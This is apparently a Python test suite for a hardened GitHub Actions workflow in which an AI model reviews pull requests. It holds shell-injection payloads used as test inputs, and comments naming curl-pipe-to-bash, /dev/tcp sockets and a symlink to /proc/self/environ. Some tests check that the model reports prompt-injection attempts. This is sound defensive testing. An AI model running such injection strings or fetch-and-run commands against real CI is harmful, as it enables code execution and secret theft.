            "reviewed list in this test. If the new value is GitHub-generated "
            "and not contributor-authored, add it here with the reason. If a "
            "contributor can write it, it does not belong in this workflow.",
        )

    # --- and the shell itself, RUN rather than read ------------------------

    def _capture_run(self) -> str:
        step = self.capture.split("Capture PR coordinates", 1)[1]
        return textwrap.dedent(scalar_block(step.split("- name:", 1)[0], "run"))

    def _execute(self, **overrides):
        """Run the capture step's real shell. Returns (rc, parsed json|None)."""
        env = {
            "PATH": "/usr/bin:/bin",
            "PR_NUM": "12345",
            "HEAD_SHA": "a" * 40,
            "BASE_SHA": "b" * 40,
            "BASE_REF": "main",
            "IS_FORK": "true",
            "TRIGGER_EVENT": "labeled",
            "REVIEW_LABEL": "in progress",
        }
        env.update(overrides)
        with tempfile.TemporaryDirectory() as td:
            proc = subprocess.run(
                ["bash", "-c", self._capture_run()],
                cwd=td,
                capture_output=True,
                text=True,
                env=env,
            )
            out = Path(td) / "pr-review-request.json"
            raw = out.read_text() if out.is_file() else None
            marker = (Path(td) / "INJECTED").exists()
        # `None` = no file. A file that is EMPTY or unparsable is also `None`
        # here, and that case is real rather than hypothetical: the redirect
        # `> pr-review-request.json` creates the file before jq runs, so a jq
        # failure leaves a 0-byte file behind. Treating that as "no usable
        # artifact" is right — and the step has already exited non-zero under
        # `set -e`, so the upload step never runs on that path.
        try:
            parsed = json.loads(raw) if raw else None
        except json.JSONDecodeError:
            parsed = None
        return proc.returncode, parsed, marker

    def test_a_well_formed_event_captures_exactly_the_declared_fields(self):
        rc, doc, _ = self._execute()
        self.assertEqual(rc, 0)
        self.assertEqual(
            doc,
            {
                "pr_number": 12345,
                "head_sha": "a" * 40,
                "base_sha": "b" * 40,
                "base_ref": "main",
                "is_fork": True,
                "trigger_event": "labeled",
                "trigger_label": "in progress",
            },
            "the artifact's shape changed; Stage 2 validates these keys by name",
        )

    def test_a_shell_payload_in_any_field_is_refused_and_never_runs(self):
        """The property `env:` plus quoting is supposed to give, MEASURED.

        Each payload would create `INJECTED` if the value were ever reaching a
        shell as code rather than as data.

        ALL SEVEN FIELDS, which the name promises and an earlier version did
        not deliver — it covered the four that carry an explicit regex and
        stopped there, so `IS_FORK`, `TRIGGER_EVENT` and `REVIEW_LABEL` were
        outside a test that claimed "any field". Their outcomes DIFFER, and
        the difference is the point:

          * the four regex-guarded fields are rejected before jq;
          * `IS_FORK` goes to `--argjson`, so a non-JSON value is a hard jq
            failure — same safe outcome, different mechanism;
          * `TRIGGER_EVENT` and `REVIEW_LABEL` go to `--arg`, which takes any
            string, so they are ACCEPTED and land in the artifact as data.
            That is correct here: neither is contributor-controlled, and
            Stage 2 re-validates `trigger_event` against a literal allowlist
            before using it. What must hold for all seven is that nothing
            EXECUTES.
        """
        payload = 'main"; touch INJECTED; #'
        rejected = ("PR_NUM", "HEAD_SHA", "BASE_SHA", "BASE_REF", "IS_FORK")
        passed_through = ("TRIGGER_EVENT", "REVIEW_LABEL")
        for field in rejected + passed_through:
            with self.subTest(field=field):
                rc, doc, injected = self._execute(**{field: payload})
                # The invariant that holds for every field, without exception.
                self.assertFalse(injected, f"{field} reached a shell as code")
                if field in rejected:
                    self.assertNotEqual(rc, 0, f"{field} was accepted: {doc}")
                    self.assertIsNone(doc, f"{field} reached the artifact")
                else:
                    self.assertEqual(rc, 0, f"{field} unexpectedly failed the step")
                    self.assertIsNotNone(doc, f"{field} produced no artifact")
                    # Carried as a JSON string value, not as anything else.
                    self.assertIn(payload, doc.values())

    def test_a_substitution_in_a_field_is_data_not_a_command(self):
        """`$(...)` specifically: the form that needs no quote to escape."""
        rc, doc, injected = self._execute(BASE_REF="$(touch INJECTED)")
        self.assertFalse(injected, "a command substitution in base_ref executed")
        self.assertNotEqual(rc, 0)
        self.assertIsNone(doc)

    def test_the_pr_number_regex_is_what_rejects_a_bad_pr_number(self):
        """ISOLATING THE CONTROL, because the test above cannot.

        `PR_NUM` is the one field passed with `--argjson`, so jq refuses a
        non-JSON value on its own. Deleting the `^[0-9]+$` check therefore left
        the shell-payload test above still passing — the payload was rejected,
        just by jq rather than by the guard the test is named for. The
        mutation battery caught that: dropping the regex SURVIVED.

        These values are all valid JSON and none is a PR number, so jq accepts
        every one of them and the regex is the only thing that does not. Each
        would otherwise reach the artifact as `pr_number` and be re-validated
        by Stage 2 — which is a real second fence, and exactly why this one
        has to be tested for what IT does rather than for the outcome.
        """
        for value in ("[1,2]", '{"a":1}', "null", "true", "1.5", "-7"):
            with self.subTest(pr_num=value):
                rc, doc, _ = self._execute(PR_NUM=value)
                self.assertNotEqual(
                    rc,
                    0,
                    f"PR_NUM={value!r} was accepted; it is valid JSON, so jq "
                    "does not stop it and the regex is the only guard that "
                    f"can. Artifact: {doc}",
                )
                self.assertIsNone(doc, f"PR_NUM={value!r} reached the artifact")

    # --- "executes nothing the PR wrote", as a MEASUREMENT -----------------
    #
    # Every test above this line reads the YAML. Reading is what the class
    # docstring calls the obligation of `pull_request_target`, and reading is
    # exactly what a maintainer adding a reasonable-looking step has already
    # got past. The three below RUN the capture script inside a PATH that
    # holds only what the script is allowed to need, so the property is
    # measured on the shell that ships rather than asserted about its text.
    #
    # ALLOWLIST, NOT DENYLIST, over the routes it can see: `curl`, `wget`,
    # `git`, `gh`, `ssh`, `nc`, `python3`, `node` and every other way to reach
    # the network or fetch a tree are absent from PATH because they were never
    # added, not because a list named them. A step that grows one BY NAME is
    # caught here without this test being updated.
    #
    # SEALING PATH ALONE WOULD NOT BE ENOUGH, and the difference is one `||`.
    # A new command that the script TOLERATES — `curl … | bash || true` — just
    # fails to launch and the run still exits 0, so the absence would prove
    # nothing. So the sandbox also installs `command_not_found_handle`, which
    # bash calls for every unresolved name in a non-interactive shell: the
    # attempt is RECORDED whether or not its failure is swallowed. Measured to
    # fire in command substitution, pipelines, subshells and background jobs.
    #
    # WHAT THIS MEASURES IS PATH-RESOLVED COMMAND NAMES. It is blind to three
    # routes, each closed somewhere else, and saying so here is the point —
    # an overstated seal is worse than a narrow one:
    #
    #   * A command word containing a slash (`/bin/cp`, `./x`) skips the PATH
    #     search, so nothing is recorded — wherever it appears, including inside
    #     `$( )`, `( )` and after `exec`.
    #   * `exec 3<>/dev/tcp/host/port` needs no command word at all.
    #   * Anything that is not a step `run:` — a `uses:` action's JavaScript, a
    #     `container:`, a job-level `defaults.run`.
    #
    # The third is closed outright, by `test_the_jobs_and_steps_are_exactly_
    # these`, `EXPECTED_USES` and `FORBIDDEN_JOB_KEYS`. The first two are
    # NARROWED, not closed: `test_the_capture_script_names_no_absolute_path` is
    # a text heuristic over path shapes and the `/dev/tcp` token sits in
    # `test_no_step_reaches_the_network_or_evaluates_fetched_text`, and neither
    # parses shell. What actually fences all three is EXPECTED_RUN_DIGESTS,
    # which pins this script byte for byte — so every one of those edits has to
    # be a deliberate act that also updates a hash.

    SEALED_TOOLS = ("jq",)

    def _execute_sealed(self, tools=SEALED_TOOLS):
        """Run the capture step with PATH holding ONLY `tools`.

        Returns (rc, files written, commands attempted). `files` is relative
        to a cwd that starts empty, and HOME and TMPDIR point into the same
        sandbox, so anything the script drops anywhere it can name shows up.
        An attempt on a command that is not on PATH is recorded as
        `MISSING:<name>`; the script under test is otherwise verbatim.
        """
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            bin_, work, home, tmp = (root / n for n in ("bin", "work", "home", "tmp"))
            for d in (bin_, work, home, tmp):
                d.mkdir()
            log = root / "calls.log"
            for tool in tools:
                real = shutil.which(tool)
                assert real, f"premise changed: {tool} is not installed"
                shim = bin_ / tool
                # Logs the NAME, then execs the real thing, so the run is
                # faithful and counted. `exec` keeps the exit status honest.
                # The name alone, not argv: jq's program argument spans lines,
                # so argv would make one call several records — and WHICH
                # arguments is already pinned, byte for byte, by
                # EXPECTED_RUN_DIGESTS. What is not pinned anywhere else, and
                # is the whole point here, is how many external programs run
                # and which.
                shim.write_text(
                    "#!/bin/sh\n"
                    f'printf "%s\\n" "{tool}" >> "$CALL_LOG"\n'
                    f'exec "{real}" "$@"\n'
                )
                shim.chmod(0o755)
            # bash by ABSOLUTE path: the interpreter has to be findable even
            # though PATH is sealed, and resolving it here rather than in the
            # child is what keeps the seal from also hiding the shell itself.
            bash = shutil.which("bash")
            assert bash, "premise changed: bash is not installed"
            # Scaffolding ABOVE the script, which is then verbatim. bash calls
            # this for any name PATH cannot resolve, so a tolerated attempt is
            # still recorded. 127 is what bash itself would have returned.
            preamble = (
                "command_not_found_handle() { "
                'printf "MISSING:%s\\n" "$1" >> "$CALL_LOG"; return 127; }\n'
            )
            proc = subprocess.run(
                [bash, "-c", preamble + self._capture_run()],
                cwd=work,
                capture_output=True,
                text=True,
                env={
                    "PATH": str(bin_),
                    "HOME": str(home),
                    "TMPDIR": str(tmp),
                    "CALL_LOG": str(log),
                    "PR_NUM": "12345",
                    "HEAD_SHA": "a" * 40,
                    "BASE_SHA": "b" * 40,
                    "BASE_REF": "main",
                    "IS_FORK": "true",
                    "TRIGGER_EVENT": "labeled",
                    "REVIEW_LABEL": "in progress",
                },
            )
            written = sorted(
                str(p.relative_to(root)) for p in root.rglob("*") if p.is_file()
            )
            calls = log.read_text().splitlines() if log.is_file() else []
        # The shims and the log are ours; drop them from the footprint.
        noise = {f"bin/{t}" for t in tools} | {"calls.log"}
        return proc.returncode, [f for f in written if f not in noise], calls

    def test_the_capture_step_needs_no_tool_but_jq(self):
        """The positive half: sealed to `jq` alone, the real script succeeds.

        That is the no-untrusted-code property stated as something a run can
        establish. Nothing on this PATH can clone, fetch, or execute a file
        from the pull request, and the step still does its whole job.
        """
        rc, written, calls = self._execute_sealed()
        self.assertEqual(rc, 0, "the capture step needs a tool beyond jq")
        self.assertEqual(
            calls,
            ["jq"],
            "the capture step runs external programs other than a single jq",
        )

    def test_an_empty_path_fails_rather_than_passing_quietly(self):
        """The control for the test above.

        Without this, a `_execute_sealed` that silently leaked the real PATH —
        or a script that stopped needing jq because it stopped doing anything —
        would read as proof. An empty PATH must break it.
        """
        rc, _, calls = self._execute_sealed(tools=())
        self.assertNotEqual(rc, 0, "the step succeeds with NOTHING on PATH")
        # And the recorder is the second half of the control: `MISSING:jq`
        # proves `command_not_found_handle` actually fires, which is what the
        # test above relies on to see a TOLERATED command.
        self.assertEqual(
            calls,
            ["MISSING:jq"],
            "the sandbox did not record the one command the script needs; "
            "neither the PATH seal nor the not-found recorder is working, and "
            "the sealed test above proves nothing while that is true.",
        )

    def test_it_writes_nothing_but_its_own_artifact(self):
        """`reads only API metadata` has a filesystem half.

        cwd starts empty and HOME and TMPDIR point into the same sandbox, so a
        step that cached a token under `~`, unpacked a tree, or dropped a
        script shows up as a second path here. Dotfiles and dot-directories
        included — `rglob` does see them.

        WHAT IT IS: a final inventory of REGULAR FILES under the sandbox root.
        Each word is a limit. It cannot see a write outside that root — by an
        absolute path (`echo x > /tmp/leak`, two builtins, so the recorder above
        is silent too) OR by a `../` escape from cwd — nor a file created and
        removed before the inventory, an empty directory, a FIFO, or anything
        under a symlinked directory. Verified on 3.12: `rglob` DOES see dotfiles
        and dot-directories, so a cached credential under `HOME` is caught.

        Closing the escapes properly needs `unshare -rm` and a private `/tmp`.
        Short of that, `test_the_capture_script_names_no_absolute_path` refuses
        the shapes that reach them — path-shaped tokens and absolute or
        `../` redirect targets — and EXPECTED_RUN_DIGESTS pins the script.
        """
        rc, written, _ = self._execute_sealed()
        self.assertEqual(rc, 0)
        self.assertEqual(
            written,
            ["work/pr-review-request.json"],
            "the capture step touches the filesystem outside its artifact",
        )


class TestNoJqArgumentIsAJqKeyword(unittest.TestCase):
    """`--arg label` parses on jq 1.7 and is a SYNTAX ERROR on jq 1.6.

    Found by executing Stage 1's capture step rather than reading it: jq
    reserves `label` for `label $out | ... | break $out`, so 1.6 rejects
    `$label` with "unexpected label, expecting IDENT" before running anything.
    1.7 accepts it. `runs-on: ubuntu-latest` is not a pinned image — it was
    ubuntu-22.04, and jq 1.6, until GitHub moved it — so this is a live
    dependency on which image the job happens to land on.

    The failure mode is the bad one. Stage 1 exits non-zero and uploads no
    artifact, and a missing artifact is exactly what a PR nobody labelled
    produces, so the pipeline goes quiet rather than red.

    Cheap to avoid entirely: never name a jq variable after a jq keyword.
    """

    # MEASURED, not recalled. Every candidate was run through
    # `jq -n --arg <name> x '{a: $<name>}'` on jq 1.6, and this is the set that
    # was REJECTED. Guessing the list got it wrong in both directions at once:
    # it omitted `break` and `module`, which really are refused, and included
    # `__loc__`, which jq accepts perfectly well as a variable name. `not` is a
    # builtin rather than a lexer keyword and is accepted too, so neither is
    # here — a false entry in this set would red a legal workflow.
    JQ_KEYWORDS = frozenset(
        """def as label import include if then else elif end
           and or reduce foreach try catch break module""".split()
    )

    def test_no_workflow_passes_jq_a_variable_named_after_a_keyword(self):
        for path in (STAGE1, STAGE2):
            names = re.findall(
                r"--arg(?:json)?\s+([A-Za-z_][\w]*)", strip_comments(path.read_text())
            )
            self.assertTrue(
                names, f"premise changed: {path.name} calls jq with no --arg"
            )
            clashes = sorted(set(names) & self.JQ_KEYWORDS)
            self.assertEqual(
                clashes,
                [],
                f"{path.name} passes jq a variable named {clashes}, which jq "
                "1.6 rejects at parse time. Rename it; the jq program is the "
                "only place the name is used.",
            )


class TestNoOtherWorkflowClaimsTheStage1Name(unittest.TestCase):
    """Stage 2 subscribes by workflow NAME, so the name has to be unique.

    `.github/scripts/ensure_actions_will_cancel.py` enforced that, among other
    things — but it selects files with `"pull_request" in on`, an exact key
    match, so moving Stage 1 to `pull_request_target` took it out of that
    check. This replaces the part of it that mattered here.

    A duplicate would need to be added to the DEFAULT branch, so this is not the
    lookalike-from-a-PR case; it is the maintainer who copies this file to
    start a variant and leaves the `name:` alone. Stage 2 would then be driven
    by whichever finished, and `github.event.workflow.path` compares
    case-INSENSITIVELY, so a copy at a differently-cased path is not separated
    by that pin either.
    """

    def test_exactly_one_workflow_is_called_hardened_pr_review(self):
        wanted = "Hardened PR Review"
        claimants = []
        # BOTH extensions. GitHub reads `.yml` and `.yaml`, and scanning only
        # one of them is how the duplicate this test exists to forbid gets in.
        files = sorted(set(WORKFLOWS.glob("*.yml")) | set(WORKFLOWS.glob("*.yaml")))
        for path in files:
            for ln in strip_comments(path.read_text()).splitlines():
                if (m := _key_re("name").match(ln)) and len(ln) - len(ln.lstrip()) == 0:
                    # FAIL CLOSED on a spelling this reader cannot decode. A
                    # `name: >-` with the text on the following line really is
                    # that name, and reading only the key's own line returned
                    # the block header — so the workflow was silently not a
                    # claimant. The reader is line-at-a-time by design; what it
                    # must not do is treat "I could not read it" as "it is not
                    # the same name".
                    raw = uncommented(m.group(1))
                    self.assertIsNone(
                        BLOCK_HEADER.fullmatch(raw),
                        f"{path.name} writes its workflow `name:` as a block "
                        f"scalar ({raw!r}); this reader cannot decode that, so "
                        "it cannot tell whether the name collides with Stage "
                        "1's. Unfold it, or teach the reader.",
                    )
                    # CASEFOLDED, for consistency with the reasoning three
                    # files away: GitHub's expression `==` ignores case, which
                    # is why the workflow-path pin is not a lookalike defence.
                    # Whether `workflows:` matches names case-insensitively is
                    # not documented either way, so a workflow called
                    # `hardened pr review` is treated as a claimant here rather
                    # than assumed harmless. A false positive costs a rename.
                    if plain_scalar(raw).casefold() == wanted.casefold():
                        claimants.append(path.name)
                    break
        self.assertEqual(
            claimants,
            [STAGE1.name],
            f"{len(claimants)} workflows are named {wanted!r} ({claimants}). "
            "Stage 2 triggers on that name, so every one of them can drive it.",
        )


class TestTheReviewModelIsNamedOnceAtTheTop(unittest.TestCase):
    """The model id was buried in `claude_args:`, ten lines into a block scalar
    that is otherwise security-critical flags. Changing it meant editing that
    block, which is the last place a routine change should land.

    It is also the answer to review question Q4 on #196845.
    """

    def setUp(self):
        self.text = STAGE2.read_text()
        self.stripped = strip_comments(self.text)

    def test_the_model_is_a_workflow_level_env_next_to_the_role(self):
        header = self.stripped.split("jobs:", 1)[0]
        models = env_values(header, "REVIEW_MODEL")
        self.assertEqual(
            len(models),
            1,
            f"REVIEW_MODEL is a workflow-level env {len(models)} times in Stage 2",
        )
        self.assertRegex(
            models[0],
            r"^global\.anthropic\.claude-[\w.-]+$",
            f"REVIEW_MODEL is {models[0]!r}, which is not a Bedrock global "
            "inference-profile id; the review step would fail to resolve it.",
        )

    def test_claude_args_takes_the_model_from_that_env_and_hardcodes_none(self):
        review = strip_comments(job_block(self.text, "review"))
        # The action's INPUTS, via the same reader the checkout tests use, so
        # a `claude_args:` moved into the step's `env:` cannot stand in for it.
        step = next(s for s in review.split("- name:") if "claude_args:" in s)
        args = scalar_block("\n".join(with_block(step)), "claude_args")
        self.assertRegex(
            args,
            r"--model\s+\$\{\{\s*env\.REVIEW_MODEL\s*\}\}",
            "the review step does not take its model from REVIEW_MODEL",
        )
        # No second, literal id anywhere in the job — that is how the env var
        # ends up decorative while a stale id is what actually runs.
        leftovers = re.findall(r"global\.anthropic\.[\w.-]+", review)
        self.assertEqual(
            leftovers,
            [],
            f"a literal model id is still spelled out in the review job "
            f"({leftovers}); REVIEW_MODEL would then not be the thing that decides.",
        )


class TestTheChangedFileListIsAPointerNotAPayload(unittest.TestCase):
    """The validator names a file for the model to Read instead of printing the
    changed-file list into its system message (#196844, Jean, major).

    That only works if three places spell the same path: the step that WRITES
    the list, the `--allowedTools` rule that lets the model open it, and the
    env var the validator is told to name. Any one of them drifting turns an
    actionable message into a pointer at nothing — and the validator's
    fallback would hide it, since it degrades quietly to naming the diff.
    """

    def setUp(self):
        self.text = STAGE2.read_text()
        self.review = strip_comments(job_block(self.text, "review"))

    def test_the_three_spellings_of_the_file_list_path_agree(self):
        env = re.search(r"(?m)^\s+PR_REVIEW_FILES_FILE:\s*(\S+)\s*$", self.review)
        self.assertIsNotNone(env, "the review step does not set PR_REVIEW_FILES_FILE")
        path = env.group(1)
        self.assertIn(
            f"> {path}",
            self.review,
            f"no step writes {path}; the validator would point the model at a "
            "file that is not there.",
        )
        self.assertIn(
            f"Read(/{path})",
            self.review,
            f"the model is not granted Read on {path}, so the pointer the "
            "validator prints is unusable.",
        )
        self.assertIn(
            path,
            self.review.split("prompt:", 1)[1],
            f"the prompt no longer tells the model that {path} exists",
        )


class TestSymlinkScrubIsNulSafe(unittest.TestCase):
    """A newline in a path component must not split one entry into two.

    The variable round-trip this replaces aimed `rm -f` at the workspace root,
    where the TRUSTED checkout sits, and the fail-closed re-scan used the same
    split so it reported clean afterwards.
    """

    def setUp(self):
        self.step = strip_comments(job_block(STAGE2.read_text(), "review"))
        # TO THE NEXT STEP ENTRY, not to a named step further down. Cutting at
        # `- name: Build the diff` let every step between the scrub and it into
        # this slice, so an assertion about the scrub could be satisfied by a
        # LATER step's text: moving the expected `PR_DIR` binding into "Fetch
        # the merge base" kept the binding test green while the scrub itself
        # ran against the trusted checkout. Measured.
        self.scrub = self.step[self.step.index("Remove symlinks that escape") :]
        # `-(?= |$)`, so a BARE list marker ends the slice too. `^      - `
        # with the trailing space let `      -` on its own line through, and
        # the next step's `env:` was then inside this slice again — the same
        # defect one spelling out. (The grammar test refuses a bare marker in
        # Stage 2 as well; this reader does not rely on it.)
        nxt = re.search(r"(?m)^      -(?: |$)", self.scrub)
        self.scrub = self.scrub[: nxt.start()] if nxt else self.scrub
        assert "- name:" not in self.scrub, "the scrub slice spans two steps"

    def test_the_scrub_step_cannot_be_skipped_or_dodged(self):
        """The scrub is the ONLY thing keeping the model's reads inside `pr/`.

        Everything else in this class reads the scrub's shell, and every one of
        those assertions passes on a step Actions never executes: `if: false`
        skips it, and `shell: bash -c "exit 0" {0}` runs something else. Either
        leaves a PR-authored symlink to, say, `/proc/self/environ` inside the
        tree the review's `Read` grant covers, while the extracted-text tests
        stay green because they run the body under their own bash.

        The job-level guard cannot see this: these are STEP keys.
        """
        refuse_disabling_keys(self, self.scrub, "the symlink scrub step")

    def test_the_scrub_is_pointed_at_the_untrusted_checkout(self):
        """Nothing else checks WHICH directory the scrub cleans.

        `test_symlink_scrub.py` sets `PR_DIR` itself, so every executable test
        in that file passes whatever the workflow binds — repoint this `env:` at
        `${{ github.workspace }}/trusted` and all 320 tests stay green while the
        PR tree keeps its escaping symlinks and the model's `Read(.../pr/**)`
        grant still reaches them. Measured.

        So the binding is checked against the checkout that actually holds PR
        code, identified by `allow-unsafe-pr-checkout`, rather than against a
        literal written twice.
        """
        review = job_block(STAGE2.read_text(), "review")
        untrusted = [
            s
            for s in steps_using(review, "actions/checkout")
            if "allow-unsafe-pr-checkout" in s
        ]
        self.assertEqual(
            len(untrusted), 1, "premise changed: not exactly one PR-code checkout"
        )
        m = next(
            (m for ln in with_block(untrusted[0]) if (m := _key_re("path").match(ln))),
            None,
        )
        self.assertIsNotNone(m, "the untrusted checkout declares no `path:`")
        pr_path = plain_scalar(m.group(1)).strip()
        self.assertRegex(
            self.scrub,
            rf"(?m)^\s*PR_DIR:[ \t]*\$\{{\{{[ \t]*github\.workspace[ \t]*\}}\}}/"
            rf"{re.escape(pr_path)}[ \t]*$",
            f"the scrub's PR_DIR is not the untrusted checkout "
            f"(`${{{{ github.workspace }}}}/{pr_path}`); it would clean a "
            "directory the PR did not write while the PR tree keeps its "
            "escaping symlinks.",
        )

    def test_the_list_is_never_joined_with_newlines(self):
        self.assertNotIn("printf '%s\\n' \"$ESCAPED\"", self.scrub)
        self.assertNotIn("ESCAPED=$(", self.scrub)
        self.assertNotIn("LEFT=$(", self.scrub)

    def test_both_the_delete_and_the_rescan_read_nul_separated(self):
        self.assertEqual(self.scrub.count("printf '%s\\0'"), 1)
        self.assertEqual(self.scrub.count("read -r -d ''"), 3)

    def test_the_delete_uses_a_double_dash(self):
        self.assertIn('rm -f -- "$link"', self.scrub)

    def test_attacker_chosen_names_are_quoted_into_the_log(self):
        # %s would let a newline in the name forge a `::error::` workflow command.
        self.assertNotIn("printf '  %s\\n' \"$link\"", self.scrub)
        self.assertIn("printf '  %q\\n' \"$link\"", self.scrub)

    def test_it_still_fails_closed(self):
        self.assertIn("::error::escaping symlink still present", self.scrub)
        self.assertIn("exit 1", self.scrub)


class TestLabelMoveCannotContradictTheRow(unittest.TestCase):
    def setUp(self):
        self.publish = strip_comments(job_block(STAGE2.read_text(), "publish"))

    def test_the_label_step_reads_the_effective_status_not_the_raw_claim(self):
        self.assertIn("steps.row.outputs.effective_status", self.publish)
        # The claim alone must not be what gates the label.
        self.assertNotIn("STATUS=$(jq -r '.status", self.publish)

    def test_the_row_step_exports_that_status(self):
        self.assertIn("effective_status=", self.publish)

    def test_the_head_is_rechecked_before_the_label_moves(self):
        self.assertIn("CURRENT_SHA", self.publish)
        self.assertIn("REVIEWED_SHA", self.publish)
        self.assertIn('"$CURRENT_SHA" != "$REVIEWED_SHA"', self.publish)

    def test_a_failed_removal_is_not_reported_as_a_move(self):
        self.assertIn("could not remove", self.publish)
        self.assertNotIn(">/dev/null 2>&1 || true", self.publish)


class TestLabelComparisonsAreCaseInsensitive(unittest.TestCase):
    """pytorch/pytorch spells the marker `Ready for Review`; `==` never matched."""

    def test_both_label_checks_downcase_both_sides(self):
        prepare = strip_comments(job_block(STAGE2.read_text(), "prepare"))
        self.assertEqual(prepare.count("ascii_downcase == ($l | ascii_downcase)"), 2)
        self.assertNotIn("any(.labels[]?.name; . == $l)", prepare)


class TestRubricSpeaksTheSchemaSeverities(unittest.TestCase):
    """The rubric and the schema in the prompt must name the same severities.

    `extract_verdict.SEVERITIES` drops a finding whose severity is outside the
    set, as `bad_severity`, before anyone reads it. The rubric used to prescribe
    `blocking` — and to prescribe it specifically for reporting a prompt-injection
    attempt, so the one finding the rubric most wants surfaced was the one
    guaranteed to be discarded.
    """

    def setUp(self):
        self.rubric = RUBRIC.read_text()
        self.stage2 = STAGE2.read_text()

    def test_the_rubric_names_no_severity_the_sanitizer_would_drop(self):
        # Every emphasised or code-quoted word the rubric uses as a severity,
        # however the sentence is phrased. An earlier version keyed on the
        # literal " finding" suffix and went blind the moment the wording
        # changed — while still passing, because one other occurrence matched.
        # No vocabulary filter — enumerating the words we already know about is
        # how `critical` walks in unnoticed — but scoped to the sentences that
        # DECLARE a severity, so ordinary prose citing a schema field is not
        # read as one. Sweeping the whole Report section and subtracting a
        # denylist did that: adding "with `path` and `line`" to the anchoring
        # instruction failed the test for no reason.
        declarations = [
            ln
            for ln in self.rubric.splitlines()
            if re.search(
                r"Report (a finding as|such an attempt as a)|`severity` must be", ln
            )
        ]
        self.assertTrue(
            declarations, "premise changed: the rubric declares no severity"
        )
        named = {
            m.lower()
            for ln in declarations
            for pair in re.findall(r"\*\*`?(\w+)`?\*\*|`(\w+)`", ln)
            for m in pair
            if m and m != "severity"
        }
        self.assertTrue(named, "premise changed: the rubric names no severity at all")
        self.assertEqual(
            named - SEVERITIES,
            set(),
            f"rubric prescribes severities the sanitizer drops: {sorted(named - SEVERITIES)}",
        )

    def test_the_prompt_schema_offers_exactly_the_sanitizer_set(self):
        line = next(
            ln for ln in self.stage2.splitlines() if '"severity":' in ln and "|" in ln
        )
        self.assertEqual(set(re.findall(r'"(\w+)"', line)) - {"severity"}, SEVERITIES)

    def test_the_injection_report_uses_a_severity_that_survives(self):
        sentence = next(
            ln for ln in self.rubric.splitlines() if "Report such an attempt" in ln
        )
        # `major` specifically, not merely a surviving severity: `minor` would
        # pass a membership check and would no longer force changes_requested.
        self.assertIn(
            "`major`",
            sentence,
            f"an injection attempt is no longer reported as major: {sentence}",
        )


# A GitHub Actions `if:` expression, tokenized. Single-quoted strings first, so
# an operator inside a literal cannot be mistaken for one: `'&&'` is a value.
_EXPR_TOKEN = re.compile(
    r"'(?:[^']|'')*'"  # single-quoted string; '' escapes a quote
    r"|&&|\|\||==|!=|<=|>="  # two-character operators
    r"|[()!<>,]"  # grouping / call args / unary not / comparisons
    r"|[^\s'()!<>,&|=]+"  # a bare term: identifier, number, dotted context path
)


def _lex_expr(expr: str) -> list[str]:
    """Tokens of `expr`, refusing anything the grammar below cannot see.

    The gaps between matches are checked rather than assumed: a lone `&` or an
    unbalanced quote would otherwise be dropped silently and the expression
    would be judged on a truncated reading of itself.
    """
    toks, pos = [], 0
    for m in _EXPR_TOKEN.finditer(expr):
        gap = expr[pos : m.start()]
        assert not gap.strip(), f"unlexable text in the `if:` expression: {gap!r}"
        toks.append(m.group(0))
        pos = m.end()
    tail = expr[pos:]
    assert not tail.strip(), f"unlexable trailing text in the `if:`: {tail!r}"
    # INDEX SYNTAX IS REFUSED, not absorbed. `github[0 && pin && 0]` lexed as
    # the two bare terms `github[0` and `0]`, which reads as `(!A) && pin && B`
    # — apparently binding — while GitHub evaluates the bracket first, finds a
    # missing property and negates a null. Brackets are legal and this parser
    # does not model their precedence, so it fails closed.
    #
    # AFTER tokenizing, and never inside a string: a bracket in a LITERAL is
    # just a character, and rejecting the raw text red the perfectly ordinary
    # `!contains(…, '[skip review]')`.
    for t in toks:
        if t.startswith("'"):
            continue
        assert "[" not in t and "]" not in t, (
            f"the `if:` expression uses index syntax, whose precedence this "
            f"parser does not model ({t!r}). Teach it, then allow this."
        )
        # GitHub Actions quotes strings with `'`. A `"` OUTSIDE a literal is an
        # undecoded YAML quote, which would be absorbed into a condition. One
        # INSIDE a literal is an ordinary character, and refusing it red the
        # legitimate `!startsWith(…, 'Revert "')`.
        assert '"' not in t, (
            f"the `if:` expression carries a double quote this reader did not "
            f"decode ({t!r}). Unquote it, or teach the reader."
        )
    return toks


_CMP_OPS = ("==", "!=", "<=", ">=", "<", ">")


def parse_bool_expr(expr: str):
    """`expr` as a propositional tree whose leaves are opaque truth values.

    `&&`, `||`, `!` and GROUPING parens are interpreted; a comparison, a context
    reference and a `contains(a, b)` call are each ONE opaque leaf. That is why
    this needs no model of GitHub's value semantics and no idea what any context
    holds — but it does have to agree with GitHub about PRECEDENCE, and the one
    that matters is that **`!` binds tighter than a comparison**. `!a == b` is
    `(!a) == b` in GitHub, not `!(a == b)`, and reading it the second way makes
    a double negation look like the identity while GitHub evaluates it to a
    constant `true`. So `!` is resolved below the comparison level and a
    negated term is folded into the comparison's own text.

    A `(` is grouping only where a term is expected; inside a term it is a call
    and is depth-tracked, so `'(' == '('` cannot corrupt the nesting the way a
    paren-counting heuristic did.

    Refuses rather than guesses. A comparison over a GROUPED sub-expression
    (`(a || b) == true`) is legal and binds, but its truth is not a function of
    the group's truth under any assignment this model can enumerate, so it is
    rejected with a message naming the limitation instead of silently read as
    something else.
    """
    toks = _lex_expr(expr)

    def term(i):
        """One value: a literal, a context path, or a `name(...)` call."""
        assert i < len(toks), "the `if:` expression ends where a term was expected"
        t = toks[i]
        assert t not in ("&&", "||", "!", ")", ",") and t not in _CMP_OPS, (
            f"the `if:` expression has {t!r} where a term was expected"
        )
        assert t != "(", "internal: a grouping paren reached term()"
        start, i = i, i + 1
        if i < len(toks) and toks[i] == "(":  # a call: absorb its balanced args
            depth = 0
            while i < len(toks):
                if toks[i] == "(":
                    depth += 1
                elif toks[i] == ")":
                    depth -= 1
                    if depth == 0:
                        i += 1
                        break
                i += 1
            else:
                raise AssertionError("unbalanced call parens in the `if:`")
        return " ".join(toks[start:i]), i

    def unary(i):
        """(node, next index, grouped?) — `!` over a term or over a group."""
        if toks[i] == "!":
            node, i, grouped = unary(i + 1)
            return ("not", node), i, grouped
        if toks[i] == "(":
            node, i = or_(i + 1)
            assert i < len(toks) and toks[i] == ")", "unbalanced parens in the `if:`"
            return node, i + 1, True
        text, i = term(i)
        return ("atom", text), i, False

    def cmp(i):
        start = i
        lhs, i, lhs_grouped = unary(i)
        if i < len(toks) and toks[i] in _CMP_OPS:
            op = toks[i]
            _rhs, j, rhs_grouped = unary(i + 1)
            assert not (lhs_grouped or rhs_grouped), (
                f"the `if:` compares a PARENTHESIZED sub-expression ({op!r} at "
